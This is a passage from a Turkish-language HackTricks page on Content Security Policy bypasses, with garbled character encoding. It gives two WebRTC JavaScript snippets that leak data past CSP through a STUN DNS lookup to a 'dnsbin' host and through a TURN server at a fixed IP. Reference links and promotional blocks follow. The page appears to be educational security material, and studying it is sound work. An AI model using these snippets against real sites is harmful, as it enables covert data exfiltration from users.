BirkaÃ§ sayfada **WebRTC'nin CSP'nin `connect-src` politikasÄ±nÄ± kontrol etmediÄŸini** okuyabilirsiniz.

AslÄ±nda, bir _DNS isteÄŸi_ kullanarak bilgi sÄ±zdÄ±rabilirsiniz. Bu kodu inceleyin:

```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

BaÅŸka bir seÃ§enek:

```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```

### Ã‡evrimiÃ§i CSP PolitikalarÄ±nÄ± Kontrol Etme

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

### Otomatik Olarak CSP OluÅŸturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

### Referanslar

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±larak deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurun!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

**Bize KatÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman'a AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'Ä± PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek katkÄ±da bulunun.

</details>
